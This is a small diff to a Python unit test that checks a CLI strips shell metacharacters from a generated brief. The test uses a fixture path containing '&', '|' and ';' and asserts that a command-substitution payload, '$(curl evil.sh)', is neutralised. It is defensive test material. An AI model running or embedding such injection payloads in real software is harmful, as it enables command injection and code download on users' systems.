@@ -346,10 +346,10 @@ class FixPromptTests(unittest.TestCase):
                     path_with_namespace="regenai/a&b|c;d")
         code, out, err = self.run_cli(findings, {"0": 901}, meta)
         self.assertEqual(code, 0, err)
-        # $, ; and & appear nowhere in this clean-fixture brief; ( ) and |
-        # do appear in the template itself, so they are checked per span
-        # below instead of brief-wide.
-        for ch in "$;&":
+        # $ and & appear nowhere in this clean-fixture brief; the ; ( ) |
+        # characters also occur in the template's own frozen text, so they
+        # are checked per span below instead of brief-wide.
+        for ch in "$&":
             self.assertNotIn(ch, out)
         self.assertNotIn("$(curl evil.sh)", out)
         self.assertIn("`feat/x curl evil.sh`", out)        # header source
